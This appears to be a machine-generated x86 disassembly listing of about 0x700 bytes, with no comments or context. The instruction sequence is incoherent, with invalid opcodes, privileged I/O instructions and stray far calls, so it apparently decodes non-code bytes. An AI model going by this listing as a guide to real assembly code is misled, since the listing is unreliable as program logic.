  4ae406:	adc    ah,BYTE PTR [ecx+0x3]
  4ae409:	jp     0x4ae451
  4ae40b:	push   es
  4ae40c:	addr16 xchg ecx,eax
  4ae40e:	xchg   ebp,eax
  4ae40f:	repz xchg edx,eax
  4ae411:	push   ds
  4ae412:	ins    DWORD PTR es:[edi],dx
  4ae413:	cmp    al,0x4a
  4ae415:	add    ebx,DWORD PTR ds:0xe882eb88
  4ae41b:	jecxz  0x4ae430
  4ae41d:	test   DWORD PTR [ebx],ecx
  4ae41f:	inc    esp
  4ae420:	out    0x8a,eax
  4ae422:	or     DWORD PTR [eax-0x79],0xa457f11c
  4ae429:	les    eax,FWORD PTR [eax+0x50]
  4ae42c:	repz lock add dl,BYTE PTR [edx]
  4ae430:	ins    BYTE PTR es:[edi],dx
  4ae431:	ss sub eax,0xac3dea84
  4ae437:	push   bp
  4ae439:	mov    eax,ds:0xc735bd0c
  4ae43e:	pop    eax
  4ae43f:	or     al,BYTE PTR ds:0xcdbb9b63
  4ae445:	push   edi
  4ae446:	icebp  
  4ae447:	fistp  DWORD PTR [ebx]
  4ae449:	mov    edi,edi
  4ae44b:	fnsave [ecx]
  4ae44d:	push   esi
  4ae44e:	test   BYTE PTR [esi],0x13
  4ae451:	xor    bh,BYTE PTR [esi]
  4ae453:	repz fisubr WORD PTR [ebp-0x6e]
  4ae457:	xor    esi,DWORD PTR [edi+ebx*1]
  4ae45a:	push   eax
  4ae45b:	push   cs
  4ae45c:	xchg   DWORD PTR [esi],eax
  4ae45e:	mov    dl,0xc
  4ae460:	mov    DWORD PTR [edx-0x5b],eax
  4ae463:	stos   DWORD PTR es:[edi],eax
  4ae464:	jl     0x4ae497
  4ae466:	xchg   esp,eax
  4ae467:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4ae468:	xor    eax,0x53804c3a
  4ae46d:	dec    edi
  4ae46e:	and    al,0xb1
  4ae470:	mov    ah,0xe6
  4ae472:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4ae473:	jge    0x4ae4ba
  4ae475:	xchg   esp,eax
  4ae476:	pop    esi
  4ae477:	mov    ds:0x4e421456,eax
  4ae47c:	nop
  4ae47d:	retf   
  4ae47e:	rcl    DWORD PTR [esi+0x60c7341],0x9b
  4ae485:	in     al,0x3b
  4ae487:	fiadd  DWORD PTR [ecx+0x20]
  4ae48a:	mov    ch,0x10
  4ae48c:	add    BYTE PTR [ebx+0x1d8ec302],dh
  4ae492:	add    dh,BYTE PTR [ecx+0x24516d01]
  4ae498:	pop    es
  4ae499:	adc    eax,0x628ce52a
  4ae49e:	xor    al,0x70
  4ae4a0:	xchg   ecx,eax
  4ae4a1:	test   al,0x5a
  4ae4a3:	push   0x20
  4ae4a5:	out    dx,eax
  4ae4a6:	xor    DWORD PTR [ecx-0x2680c3c],eax
  4ae4ac:	push   ebx
  4ae4ad:	inc    ebx
  4ae4ae:	test   al,0x13
  4ae4b0:	mov    WORD PTR [edx+0x20724b08],cs
  4ae4b6:	popa   
  4ae4b7:	cli    
  4ae4b8:	xor    al,0x7a
  4ae4ba:	adc    al,0x4a
  4ae4bc:	ret    0x1c82
  4ae4bf:	dec    esp
  4ae4c0:	cmp    eax,DWORD PTR [ebx-0x64]
  4ae4c3:	or     edx,ebx
  4ae4c5:	sahf   
  4ae4c6:	inc    eax
  4ae4c7:	cmp    eax,0x611c5b02
  4ae4cc:	lds    esp,FWORD PTR [ebx-0x5d1417ea]
  4ae4d2:	inc    ebp
  4ae4d3:	add    esi,DWORD PTR [eax+ebp*4]
  4ae4d6:	xlat   BYTE PTR ds:[ebx]
  4ae4d7:	push   0x8a505651
  4ae4dc:	push   0xb249ada0
  4ae4e1:	push   es
  4ae4e2:	xlat   BYTE PTR ds:[ebx]
  4ae4e3:	push   es
  4ae4e4:	cmc    
  4ae4e5:	mov    esi,0xbc96f735
  4ae4ea:	mov    ch,0xd
  4ae4ec:	sub    DWORD PTR [ebp+0x289a157a],edx
  4ae4f2:	lods   al,BYTE PTR ds:[esi]
  4ae4f3:	xor    al,0xa8
  4ae4f5:	or     DWORD PTR [edi+0x5d85077a],0xf497a34d
  4ae4ff:	inc    ecx
  4ae500:	nop
  4ae501:	push   cs
  4ae502:	jl     0x4ae515
  4ae504:	pop    es
  4ae505:	cmp    ch,BYTE PTR [eax+0x2f]
  4ae508:	mov    dh,0xcf
  4ae50a:	add    DWORD PTR [eax+0x3a],edx
  4ae50d:	into   
  4ae50e:	sub    eax,0xed4127d2
  4ae513:	mov    ecx,0x214c567a
  4ae518:	loope  0x4ae572
  4ae51a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4ae51b:	dec    ebx
  4ae51c:	sub    al,0x24
  4ae51e:	push   ds
  4ae51f:	and    ecx,DWORD PTR ds:0xc2304e11
  4ae525:	and    DWORD PTR [esi],esp
  4ae527:	jno    0x4ae4e5
  4ae529:	call   0xc92:0xcc36d37b
  4ae530:	and    DWORD PTR [ecx+ecx*2],ebx
  4ae533:	call   0x5ad3:0xd53b5f9f
  4ae53a:	mov    eax,0x22446e4b
  4ae53f:	mov    esi,es
  4ae541:	call   0x2090a06
  4ae546:	push   es
  4ae547:	adc    BYTE PTR [edx-0x5e727dbd],bh
  4ae54d:	xor    cl,BYTE PTR [ebx+0x5bc5a117]
  4ae553:	mov    BYTE PTR [edx+0x8171e38],dl
  4ae559:	pusha  
  4ae55a:	or     DWORD PTR [ebx-0x77df4100],ebp
  4ae560:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4ae561:	push   eax
  4ae562:	in     eax,dx
  4ae563:	or     bh,BYTE PTR [esi]
  4ae565:	xor    BYTE PTR [esi],al
  4ae567:	adc    edi,DWORD PTR [edi+0x4918c677]
  4ae56d:	mov    ds:0x917d22c9,eax
  4ae572:	cmp    al,BYTE PTR [ecx]
  4ae574:	loope  0x4ae5f3
  4ae576:	scas   eax,DWORD PTR es:[edi]
  4ae577:	xchg   esp,eax
  4ae578:	test   BYTE PTR [ebp+0x22],cl
  4ae57b:	ja     0x4ae5be
  4ae57d:	outs   dx,DWORD PTR ds:[esi]
  4ae57e:	jge    0x4ae52b
  4ae580:	clc    
  4ae581:	aas    
  4ae582:	push   edi
  4ae583:	jle    0x4ae5ca
  4ae585:	mov    esp,DWORD PTR [eax]
  4ae587:	and    al,0x12
  4ae589:	fild   WORD PTR [ecx+0x4c]
  4ae58c:	mov    eax,DWORD PTR [eax+ecx*1+0xc]
  4ae590:	push   eax
  4ae591:	test   BYTE PTR [ebx],ch
  4ae593:	add    al,0xf4
  4ae595:	ins    DWORD PTR es:[edi],dx
  4ae596:	scas   eax,DWORD PTR es:[edi]
  4ae597:	and    eax,0xa27f4908
  4ae59c:	push   eax
  4ae59d:	cmp    edx,DWORD PTR [edi]
  4ae59f:	jl     0x4ae579
  4ae5a1:	mov    al,ds:0xfa740365
  4ae5a6:	adc    al,0x76
  4ae5a8:	add    DWORD PTR [edx],eax
  4ae5aa:	mov    esi,0x2fe8593d
  4ae5af:	retf   
  4ae5b0:	inc    ecx
  4ae5b1:	inc    esp
  4ae5b2:	cmp    esi,DWORD PTR ss:[edi]
  4ae5b5:	jge    0x4ae596
  4ae5b7:	xchg   esp,eax
  4ae5b8:	xor    al,0x21
  4ae5ba:	add    al,0xd4
  4ae5bc:	(bad)  
  4ae5bd:	lock les edi,FWORD PTR [edx-0x2d]
  4ae5c1:	cwde   
  4ae5c2:	out    0x4,al
  4ae5c4:	push   es
  4ae5c5:	add    eax,DWORD PTR [edi-0x16]
  4ae5c8:	dec    ebx
  4ae5c9:	inc    ebx
  4ae5ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4ae5cb:	push   es
  4ae5cc:	xchg   ebx,eax
  4ae5cd:	lea    ecx,[edi+eiz*1+0x11]
  4ae5d1:	(bad)  
  4ae5d2:	push   ebx
  4ae5d3:	mov    esp,esp
  4ae5d5:	shr    BYTE PTR [eax+0x24],cl
  4ae5d8:	sub    BYTE PTR [edi-0x76f37ff0],ch
  4ae5de:	push   edi
  4ae5df:	or     BYTE PTR [eax+0x58],cl
  4ae5e2:	xchg   ebx,eax
  4ae5e3:	lock lea eax,[ecx+0x3790642b]
  4ae5ea:	aad    0xa9
  4ae5ec:	pop    esp
  4ae5ed:	inc    ecx
  4ae5ee:	cmc    
  4ae5ef:	lds    ecx,FWORD PTR [edx+ecx*2+0x7b]
  4ae5f3:	adc    BYTE PTR [edi],ah
  4ae5f5:	dec    eax
  4ae5f6:	sbb    al,0x50
  4ae5f8:	push   ds
  4ae5f9:	cwde   
  4ae5fa:	ja     0x4ae57c
  4ae5fc:	jle    0x4ae607
  4ae5fe:	ss sub al,0xa4
  4ae601:	mov    al,0x0
  4ae603:	pop    esi
  4ae604:	push   ecx
  4ae605:	or     edx,DWORD PTR [ebx]
  4ae607:	sbb    DWORD PTR [edx],edx
  4ae609:	les    edi,FWORD PTR [esi+0x32]
  4ae60c:	div    DWORD PTR [edx+0x53d09098]
  4ae612:	jmp    0x4ae59f
  4ae614:	dec    ebp
  4ae615:	retf   0x3b76
  4ae618:	cmp    al,0xf4
  4ae61a:	sbb    DWORD PTR [edi+0x27],edx
  4ae61d:	and    eax,0x8435d0e
  4ae622:	push   edx
  4ae623:	test   eax,0x30049c0b
  4ae628:	jae    0x4ae63e
  4ae62a:	adc    bh,BYTE PTR [ebx-0x1ed8bede]
  4ae630:	fwait
  4ae631:	pusha  
  4ae632:	in     al,dx
  4ae633:	push   ebp
  4ae634:	outs   dx,DWORD PTR ds:[esi]
  4ae635:	adc    BYTE PTR [edi+0x5f],dh
  4ae638:	dec    ecx
  4ae639:	rcl    BYTE PTR [ebp+0x76],cl
  4ae63c:	sub    BYTE PTR [ebx],0x38
  4ae63f:	pop    ss
  4ae640:	or     al,0x99
  4ae642:	es or  al,0xaf
  4ae645:	dec    ecx
  4ae646:	jne    0x4ae65e
  4ae648:	and    dl,bl
  4ae64a:	out    0x69,eax
  4ae64c:	mov    eax,ds:0x24452a63
  4ae651:	jmp    0x4ae686
  4ae653:	pop    ecx
  4ae654:	pop    esi
  4ae655:	fwait
  4ae656:	cmp    DWORD PTR [ecx+0x24],ebx
  4ae659:	cvtps2pi mm3,QWORD PTR [edi+eiz*2]
  4ae65d:	jmp    0x4ae66e
  4ae65f:	out    dx,eax
  4ae660:	mov    ebp,0x68419285
  4ae665:	sub    al,0x2d
  4ae667:	mov    DWORD PTR [ebx],ebp
  4ae669:	jl     0x4ae675
  4ae66b:	mov    bh,0x74
  4ae66d:	push   cs
  4ae66e:	push   es
  4ae66f:	loopne 0x4ae6d9
  4ae671:	mov    edi,0xf3cf855e
  4ae676:	fisub  DWORD PTR [eax+0x6cdf437]
  4ae67c:	(bad)  
  4ae67d:	stc    
  4ae67e:	icebp  
  4ae67f:	aaa    
  4ae680:	outs   dx,DWORD PTR ds:[esi]
  4ae681:	adc    eax,0x4576b02
  4ae686:	add    DWORD PTR [ebx-0x43],esp
  4ae689:	jo     0x4ae64c
  4ae68b:	bound  ebx,QWORD PTR [eax+0xb]
  4ae68e:	push   ebx
  4ae68f:	and    DWORD PTR [edx+0x5],ecx
  4ae692:	push   esi
  4ae693:	mov    ds:0xe9305939,al
  4ae698:	ror    ebx,0x5d
  4ae69b:	ret    
  4ae69c:	sbb    dl,BYTE PTR [eax+esi*4-0x45a46592]
  4ae6a3:	inc    eax
  4ae6a4:	ret    0xed3b
  4ae6a7:	xor    eax,DWORD PTR [ecx+0xf609054]
  4ae6ad:	or     DWORD PTR [edx+0x64],edi
  4ae6b0:	(bad)  
  4ae6b1:	and    BYTE PTR [ecx+0x20],ah
  4ae6b4:	jns    0x4ae682
  4ae6b6:	loope  0x4ae678
  4ae6b8:	popa   
  4ae6b9:	fistp  DWORD PTR [ebp-0x7272046e]
  4ae6bf:	inc    ebx
  4ae6c0:	push   ebx
  4ae6c1:	push   ecx
  4ae6c2:	das    
  4ae6c3:	and    BYTE PTR [esp+eax*1-0x18],cl
  4ae6c7:	loopne 0x4ae64d
  4ae6c9:	fwait
  4ae6ca:	cmp    BYTE PTR [ebp-0x90cfb7c],ah
  4ae6d0:	and    DWORD PTR [ebx-0x4f6fde43],eax
  4ae6d6:	sub    ebp,0x5975753f
  4ae6dc:	jb     0x4ae725
  4ae6de:	sahf   
  4ae6df:	das    
  4ae6e0:	stos   DWORD PTR es:[edi],eax
  4ae6e1:	and    al,0x9c
  4ae6e3:	or     cl,bl
  4ae6e5:	push   ds
  4ae6e6:	in     eax,dx
  4ae6e7:	sub    BYTE PTR [edx],dh
  4ae6e9:	inc    eax
  4ae6ea:	inc    edx
  4ae6eb:	inc    eax
  4ae6ec:	cs mov al,ch
  4ae6ef:	mov    ebx,0xf996cbdf
  4ae6f4:	lods   al,BYTE PTR ds:[esi]
  4ae6f5:	mov    esp,0x57f7b8f9
  4ae6fa:	lods   al,BYTE PTR ds:[esi]
  4ae6fb:	cmc    
  4ae6fc:	cdq    
  4ae6fd:	push   ebp
  4ae6fe:	fmul   DWORD PTR [ecx-0x2e9ebe34]
  4ae704:	repz (bad) 
  4ae706:	pop    ebx
  4ae707:	addr16 test eax,0x5d6afb96
  4ae70d:	push   edx
  4ae70e:	ret    
  4ae70f:	mov    bl,0xdd
  4ae711:	adc    eax,0x663a257a
  4ae716:	cmp    DWORD PTR [ebp+0x5e167499],ebx
  4ae71c:	jns    0x51eb9e02
  4ae722:	gs cmp eax,0x1371f08
  4ae728:	outs   dx,DWORD PTR ds:[esi]
  4ae729:	or     BYTE PTR [edi+0x67182343],ch
  4ae72f:	cdq    
  4ae730:	dec    ebp
  4ae731:	fbstp  TBYTE PTR [ebx+ebp*1+0x27]
  4ae735:	xchg   ebp,eax
  4ae736:	std    
  4ae737:	xchg   al,dh
  4ae739:	add    al,0xab
  4ae73b:	into   
  4ae73c:	lds    ebp,FWORD PTR [ecx]
  4ae73e:	pop    ebp
  4ae73f:	cs add al,0xef
  4ae742:	cmp    eax,0x612c28a8
  4ae747:	test   DWORD PTR [eax+0x61],edx
  4ae74a:	retf   
  4ae74b:	push   ds
  4ae74c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4ae74d:	addr16 pop es
  4ae74f:	xor    ch,BYTE PTR [ecx]
  4ae751:	mov    ebp,0x2c19134d
  4ae756:	popf   
  4ae757:	fs cwde 
  4ae759:	ins    DWORD PTR es:[edi],dx
  4ae75a:	not    DWORD PTR [eax+0x2bf71ec2]
  4ae760:	leave  
  4ae761:	pop    ecx
  4ae762:	or     eax,0xd6241e12
  4ae767:	into   
  4ae768:	mov    edi,0x8524f642
  4ae76d:	ss dec ecx
  4ae76f:	and    dl,BYTE PTR [edx+0x71c141b0]
  4ae775:	imul   eax,esp,0xc701e120
  4ae77b:	pop    eax
  4ae77c:	push   edx
  4ae77d:	cli    
  4ae77e:	inc    eax
  4ae77f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4ae780:	push   cs
  4ae781:	or     BYTE PTR [edi],dh
  4ae783:	sub    eax,0x430dfb2
  4ae789:	mov    esi,0x554a8894
  4ae78e:	pusha  
  4ae78f:	xor    BYTE PTR [eax],dl
  4ae791:	add    esi,DWORD PTR [ebx-0x7b5d9170]
  4ae797:	dec    ebp
  4ae798:	push   ecx
  4ae799:	retf   0x94c
  4ae79c:	xchg   esi,eax
  4ae79d:	gs repz test eax,0x73425620
  4ae7a4:	jno    0x4ae766
  4ae7a6:	mov    eax,0x58fc8db2
  4ae7ab:	lock jno 0x4ae817
  4ae7ae:	or     BYTE PTR [esi-0x18],cl
  4ae7b1:	pop    esi
  4ae7b2:	call   0x9651d712
  4ae7b7:	stc    
  4ae7b8:	xor    al,0x85
  4ae7ba:	les    esi,FWORD PTR [edx+0x15485952]
  4ae7c0:	les    edi,FWORD PTR [esi-0x7d]
  4ae7c3:	or     al,0x84
  4ae7c5:	nop
  4ae7c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4ae7c7:	sbb    cl,BYTE PTR [esp+edx*1]
  4ae7ca:	xchg   DWORD PTR [ecx-0x4d],esi
  4ae7cd:	rol    BYTE PTR [edx-0x3e6be13d],1
  4ae7d3:	test   BYTE PTR [edx+0x1e],dl
  4ae7d6:	sub    BYTE PTR ds:0x230caf85,bh
  4ae7dc:	or     al,0xb1
  4ae7de:	push   eax
  4ae7df:	imul   edx,DWORD PTR [edx],0xef1f8c78
  4ae7e5:	fmul   st(5),st
  4ae7e7:	adc    BYTE PTR [ecx+esi*4+0x45],ch
  4ae7eb:	mov    WORD PTR [eax-0x523d574c],ds
  4ae7f1:	lea    ebp,[ecx-0x46]
  4ae7f4:	scas   eax,DWORD PTR es:[edi]
  4ae7f5:	xor    BYTE PTR [eax],dh
  4ae7f7:	xchg   edx,eax
  4ae7f8:	out    dx,al
  4ae7f9:	retf   
  4ae7fa:	ret    0xad05
  4ae7fd:	push   eax
  4ae7fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4ae7ff:	add    eax,0xb876b7dd
  4ae804:	xor    al,0x21
  4ae806:	rol    BYTE PTR [ebx+0x4a],0xf7
  4ae80a:	lea    ebx,[eax-0x6f7f5dec]
  4ae810:	or     DWORD PTR [edi],ebx
  4ae812:	mov    dh,0xf4
  4ae814:	ins    BYTE PTR es:[edi],dx
  4ae815:	rcl    BYTE PTR [edi],0xcd
  4ae818:	inc    ecx
  4ae819:	leave  
  4ae81a:	add    eax,0x119cc466
  4ae81f:	pop    ebx
  4ae820:	call   0x53e66452
  4ae825:	popf   
  4ae826:	push   edi
  4ae827:	xor    cl,BYTE PTR [eax-0x49]
  4ae82a:	rcl    BYTE PTR [ebp+0x5b3c965f],1
  4ae830:	jnp    0x4ae83d
  4ae832:	sub    esp,DWORD PTR [ecx+0x5c9db4b8]
  4ae838:	xchg   BYTE PTR [edx],dh
  4ae83a:	and    BYTE PTR [edi],ah
  4ae83c:	and    edi,DWORD PTR [esp+edi*1]
  4ae83f:	pop    ebx
  4ae840:	sub    bl,BYTE PTR [ebp-0x5248f97e]
  4ae846:	mov    BYTE PTR [ebx-0x5f],al
  4ae849:	xchg   BYTE PTR [esi+edi*4],cl
  4ae84c:	cmp    BYTE PTR [ebx-0x4f],bl
  4ae84f:	adc    dh,BYTE PTR [eax+0x3]
  4ae852:	test   BYTE PTR [ecx],al
  4ae854:	adc    BYTE PTR [esi+0x14],cl
  4ae857:	or     ch,0x2f
  4ae85a:	dec    ebp
  4ae85b:	addr16 xchg edx,eax
  4ae85d:	adc    DWORD PTR [esi],edx
  4ae85f:	add    edx,DWORD PTR [edi]
  4ae861:	cmp    BYTE PTR [esi+0x14],0xa
  4ae865:	cdq    
  4ae866:	fst    DWORD PTR [eax+0x341a0a69]
  4ae86c:	push   ss
  4ae86d:	pop    esp
  4ae86e:	sahf   
  4ae86f:	retf   
  4ae870:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4ae871:	push   ds
  4ae872:	adc    eax,0x1c16151b
  4ae877:	sahf   
  4ae878:	retf   
  4ae879:	in     eax,0xb9
  4ae87b:	push   ss
  4ae87c:	pop    ss
  4ae87d:	sbb    eax,0xa071817
  4ae882:	mov    dh,0x5c
  4ae884:	push   ds
  4ae885:	push   ss
  4ae886:	adc    al,0xad
  4ae888:	or     DWORD PTR [edx-0x2f],eax
  4ae88b:	je     0x4ae8fc
  4ae88d:	push   es
  4ae88e:	hlt    
  4ae88f:	fisttp WORD PTR [edx+0x3565b5fa]
  4ae895:	mov    cl,BYTE PTR [esi+0x1a]
  4ae898:	jnp    0x4ae875
  4ae89a:	jecxz  0x4ae837
  4ae89c:	pop    esp
  4ae89d:	call   0x46d57cef
  4ae8a2:	sbb    eax,DWORD PTR [eax+0x12]
  4ae8a5:	inc    ebp
  4ae8a6:	xchg   ebp,eax
  4ae8a7:	and    BYTE PTR [edx],cl
  4ae8a9:	adc    al,0x26
  4ae8ab:	addr16 inc esp
  4ae8ad:	loop   0x4ae8b5
  4ae8af:	mov    BYTE PTR ds:0x9ef904cd,ch
  4ae8b5:	and    eax,0xb293c681
  4ae8ba:	sbb    eax,0xda5a0619
  4ae8bf:	fmul   DWORD PTR [esi+0x4e]
  4ae8c2:	inc    esi
  4ae8c3:	lea    ecx,[edi+0x47]
  4ae8c6:	hlt    
  4ae8c7:	add    BYTE PTR [ecx+0x54],ch
  4ae8ca:	adc    BYTE PTR [ebp-0x5c],cl
  4ae8cd:	dec    edi
  4ae8ce:	add    DWORD PTR [ebp+esi*2+0x57],ebx
  4ae8d2:	stc    
  4ae8d3:	cmp    cl,BYTE PTR [edx-0x75]
  4ae8d6:	cmp    eax,0x1181b42
  4ae8db:	mov    DWORD PTR [eax-0x45e48f27],ebx
  4ae8e1:	enter  0x8918,0x11
  4ae8e5:	sub    eax,0xa1b70c1b
  4ae8ea:	rol    DWORD PTR [edi+0x1875ef1e],cl
  4ae8f0:	sub    ebp,edi
  4ae8f2:	dec    ecx
  4ae8f3:	js     0x4ae922
  4ae8f5:	mov    DWORD PTR [edi+esi*4],eax
  4ae8f8:	jae    0x4ae8d8
  4ae8fa:	inc    esi
  4ae8fb:	adc    BYTE PTR [ecx+ebx*8],cl
  4ae8fe:	pop    ebp
  4ae8ff:	push   0x418ba1
  4ae904:	jmp    0xd9c946cb
  4ae909:	fld    QWORD PTR [edx+0x1b7fba77]
  4ae90f:	sub    eax,0x8eed7e03
  4ae914:	(bad)  
  4ae916:	nop
  4ae917:	jg     0x4ae983
  4ae919:	adc    DWORD PTR [eax-0x7],edi
  4ae91c:	push   cs
  4ae91d:	sbb    dh,bl
  4ae91f:	jnp    0x4ae956
  4ae921:	jnp    0x4ae953
  4ae923:	sbb    edx,ebp
  4ae925:	adc    eax,0x126aed26
  4ae92a:	out    0xf2,al
  4ae92c:	(bad)  
  4ae92d:	ficom  DWORD PTR [eax]
  4ae92f:	ins    BYTE PTR es:[edi],dx
  4ae930:	adc    ah,cl
  4ae932:	ins    BYTE PTR es:[edi],dx
  4ae933:	sbb    eax,0xac032072
  4ae938:	adc    bl,bl
  4ae93a:	pop    ebx
  4ae93b:	pop    ebx
  4ae93c:	hlt    
  4ae93d:	dec    edx
  4ae93e:	sub    dl,BYTE PTR [ebx]
  4ae940:	push   ds
  4ae941:	pop    ebx
  4ae942:	pop    edi
  4ae943:	pop    ebx
  4ae944:	nop
  4ae945:	out    0x32,al
  4ae947:	shr    ch,cl
  4ae949:	pop    ecx
  4ae94a:	or     BYTE PTR [edi+0x3f5bc191],dh
  4ae950:	popf   
  4ae951:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4ae952:	mov    ah,0xd4
  4ae954:	cmp    ch,BYTE PTR [esp+ebp*8-0x4baf0729]
  4ae95b:	adc    al,0x7e
  4ae95d:	loop   0x4ae960
  4ae95f:	shl    DWORD PTR [esp+ebp*1],0x53
  4ae963:	push   cs
  4ae964:	pusha  
  4ae965:	in     eax,dx
  4ae966:	xchg   BYTE PTR [eax-0xd0fca71],ah
  4ae96c:	pextrw eax,(bad),0xc5
  4ae96e:	test   al,dh
  4ae970:	shr    BYTE PTR [esp+ebp*8+0x75e2d3b6],cl
  4ae977:	or     eax,0xf1bf406a
  4ae97c:	xor    eax,0xdab9f833
  4ae981:	sar    DWORD PTR [eax-0x34e4eadc],0x27
  4ae988:	or     BYTE PTR [edi+0x65],ch
  4ae98b:	hlt    
  4ae98c:	mov    dh,0xf2
  4ae98e:	sub    edi,esp
  4ae990:	mov    edi,0xe1023ad3
  4ae995:	adc    al,0xa4
  4ae997:	cmc    
  4ae998:	xlat   BYTE PTR ds:[ebx]
  4ae999:	push   esi
  4ae99a:	adc    al,0x6b
  4ae99c:	and    DWORD PTR [edx],ecx
  4ae99e:	xchg   ecx,eax
  4ae99f:	push   edx
  4ae9a0:	je     0x4aea06
  4ae9a2:	and    esi,DWORD PTR [ebx+0x27]
  4ae9a5:	mov    al,0x55
  4ae9a7:	fucomp st(4)
  4ae9a9:	dec    eax
  4ae9aa:	jmp    0xaa36458
  4ae9af:	js     0x4ae998
  4ae9b1:	fimul  WORD PTR [ecx]
  4ae9b3:	xor    al,0x2
  4ae9b5:	mov    al,ds:0x10c28aed
  4ae9ba:	adc    bl,BYTE PTR [esi-0x23ef907e]
  4ae9c0:	and    DWORD PTR [ebx],eax
  4ae9c2:	ss sbb eax,0x1082c94
  4ae9c8:	mov    BYTE PTR [ebp+0x8],bl
  4ae9cb:	mov    eax,ds:0xd08932e4
  4ae9d0:	cmp    dh,BYTE PTR [eax]
  4ae9d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4ae9d3:	adc    eax,0xd18382b5
  4ae9d8:	xor    cl,BYTE PTR [eax]
  4ae9da:	mov    dh,0xf2
  4ae9dc:	sbb    bl,BYTE PTR [ecx+ecx*2-0x3c]
  4ae9e0:	aaa    
  4ae9e1:	xchg   ebx,eax
  4ae9e2:	and    ebp,DWORD PTR ds:0x16ead322
  4ae9e8:	test   BYTE PTR [edi+0xf],dl
  4ae9eb:	and    dl,BYTE PTR [ebp-0x76a22de5]
  4ae9f1:	addr16 or eax,0xbefb6085
  4ae9f7:	(bad)  
  4ae9f8:	mov    esp,0x6b6960ed
  4ae9fd:	sbb    DWORD PTR [edx+0x9ec2e37],ebx
  4aea03:	(bad)  
  4aea05:	sbb    DWORD PTR ds:0x5fc7d0eb,edx
  4aea0b:	jne    0x4aea23
  4aea0d:	xchg   DWORD PTR [ecx+0x48],edi
  4aea10:	popa   
  4aea11:	or     ecx,DWORD PTR [ebx+0x7a]
  4aea14:	iret   
  4aea15:	pop    edx
  4aea16:	xor    BYTE PTR [eax+0x4b],dh
  4aea19:	mov    ah,0xcb
  4aea1b:	sbb    bl,BYTE PTR [edi+0x7a]
  4aea1e:	push   0x284713d2
  4aea23:	int    0x4b
  4aea25:	test   BYTE PTR [ecx+0x3db88705],ah
  4aea2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4aea2c:	aad    0x43
  4aea2e:	or     eax,0xfb9adf96
  4aea33:	nop
  4aea34:	or     ecx,DWORD PTR [edx+0x33]
  4aea37:	dec    edi
  4aea38:	mov    esi,0x89bd2cd0
  4aea3d:	stos   DWORD PTR es:[edi],eax
  4aea3e:	pop    es
  4aea3f:	cmp    ch,BYTE PTR [esp+edx*8-0x80]
  4aea43:	jnp    0x4ae9f7
  4aea45:	xor    bl,BYTE PTR [ecx-0x63]
  4aea48:	mov    al,ds:0xf10bd2b
  4aea4d:	push   edx
  4aea4e:	push   esp
  4aea4f:	xchg   edx,eax
  4aea50:	lock das 
  4aea52:	fild   QWORD PTR [eax+0x60]
  4aea55:	push   esi
  4aea56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4aea57:	mov    ds:0x62a4b585,eax
  4aea5c:	aas    
  4aea5d:	and    eax,0x758911c
  4aea62:	mov    bl,0x43
  4aea64:	xchg   DWORD PTR [ebx-0x2341af86],eax
  4aea6a:	(bad)  
  4aea6c:	or     al,0x9c
  4aea6e:	fs cwde 
  4aea70:	push   esi
  4aea71:	jmp    0x4aea8c
  4aea73:	sub    al,0x5b
  4aea75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4aea76:	out    0x33,eax
  4aea78:	push   esi
  4aea79:	xor    eax,0xff2d50b0
  4aea7e:	add    dh,cl
  4aea80:	bound  dx,DWORD PTR [edi]
  4aea83:	jge    0x4aea9d
  4aea85:	nop
  4aea86:	push   ss
  4aea87:	in     al,0x1d
  4aea89:	mov    eax,ds:0x142a56e0
  4aea8e:	cmp    BYTE PTR [edx],dl
  4aea90:	mov    al,0x64
  4aea92:	hlt    
  4aea93:	dec    esi
  4aea94:	in     al,dx
  4aea95:	add    eax,DWORD PTR [edx]
  4aea97:	das    
  4aea98:	dec    ecx
  4aea99:	mov    bh,0x3a
  4aea9b:	or     al,0x2c
  4aea9d:	fsub   DWORD PTR [ebp+0x7b]
  4aeaa0:	xor    DWORD PTR [ebx+0x5],esp
  4aeaa3:	push   esi
  4aeaa4:	lock sub eax,0x82b87b41
  4aeaaa:	lock mov cl,0x79
  4aeaad:	push   es
  4aeaae:	aaa    
  4aeaaf:	pop    esp
  4aeab0:	xor    al,BYTE PTR [ebx]
  4aeab2:	sub    cl,BYTE PTR [eax]
  4aeab4:	xchg   ebp,eax
  4aeab5:	in     al,dx
  4aeab6:	cs dec edi
  4aeab8:	dec    edx
  4aeab9:	xchg   ebx,eax
  4aeaba:	mov    esp,esp
  4aeabc:	inc    edi
  4aeabd:	add    DWORD PTR [eax+0xc],edx
  4aeac0:	adc    BYTE PTR [esp+eax*1+0x6c59f76b],bh
  4aeac7:	add    ch,BYTE PTR [eax]
  4aeac9:	push   edi
  4aeaca:	inc    eax
  4aeacb:	push   ss
  4aeacc:	mov    edx,0x971aca47
  4aead1:	and    DWORD PTR [ebp+0x5c],esp
  4aead4:	sbb    DWORD PTR [edx+0x22],eax
  4aead7:	outs   dx,DWORD PTR ds:[esi]
  4aead8:	test   DWORD PTR [edx+0x126d6829],ebx
  4aeade:	scas   eax,DWORD PTR es:[edi]
  4aeadf:	ja     0x4aeb59
  4aeae1:	rol    edx,cl
  4aeae3:	int3   
  4aeae4:	mov    ecx,gs
  4aeae6:	xor    DWORD PTR [ecx+0x1792c285],ecx
  4aeaec:	jmp    0x4aeb2b
  4aeaee:	dec    esp
  4aeaef:	jmp    0x4640:0x536bf66e
  4aeaf6:	jo     0x4aeb52
  4aeaf8:	adc    eax,0x483c758b
  4aeafd:	fadd   QWORD PTR [ecx+0x70fe914a]
  4aeb03:	xor    DWORD PTR [ecx],ebp
  4aeb05:	push   edi
  4aeb06:	iret   
